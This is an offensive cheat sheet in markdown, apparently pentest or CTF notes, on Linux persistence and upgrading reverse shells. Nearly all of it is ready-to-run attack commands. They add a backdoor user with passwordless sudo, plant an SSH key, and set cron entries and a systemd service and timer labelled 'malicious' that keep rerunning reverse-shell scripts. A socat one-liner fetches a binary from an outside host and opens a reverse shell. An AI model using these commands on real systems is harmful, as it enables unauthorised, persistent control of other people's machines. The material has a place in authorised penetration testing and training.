basic reverse shells [revshell generator](https://www.revshells.com/)

[art of linux persistence](https://hadess.io/the-art-of-linux-persistence/)

## add user

```
echo -e "drowssap\\drowssap\\" | useradd dev; usermod -aG sudo dev; echo "dev ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

## SSH Persistence

[generate an ssh key on attacker server](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)

on attacker server
```
echo "./user_rsa" | ssh-keygen -t rsa -b 4096 -C "your_email@example.com"; chmod 600 ./user_rsa; cat ./user_rsa.pub
```

on victim server
```
echo "" >> ~/.ssh/authorized_keys
```

on attacker server
```
ssh -i id_rsa user@${box_ip}
```

## crontab / cronjob reverse shells (every minute)

nano /etc/crontab

```
* * * * *    /lib/systemd/revshell.sh
* * * * *    /usr/bin/revshell.sh
* *  * * *  root  /opt/revshell.sh
```

### systemd malicious service

nano /etc/systemd/system/malicious.service

```
[Unit]

Description=Bad service

[Service]

ExecStart=/opt/shell.sh
```

then create a malicious systemd timer to run that service

nano /etc/systemd/system/malicious.timer

```
[Unit]

Description=malicious timer

[Timer]

OnBootSec=5

OnUnitActiveSec=5m

[Install]

WantedBy=timers.target
```

make sure to start the service and enable it to make it working 

```shell

# systemctl daemon-reload 

systemctl enable malicious.timer

systemctl start malicious.timer

```


## upgrade revserse shells


**improve screen**

```
export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

**python**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


**socat** - [get socat here](https://github.com/andrew-d/static-binaries)

```bash
(load onto target box)

wget -q https://10.10.10.10:8000/socat -O /tmp/socat; chmod +x /tmp/socat

(listener)

socat file:`tty`,raw,echo=0 tcp-listen:4444

(target box)

/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

(target oneliner)

wget -q https://10.10.10.10:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

**stty**

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 38 columns 116
```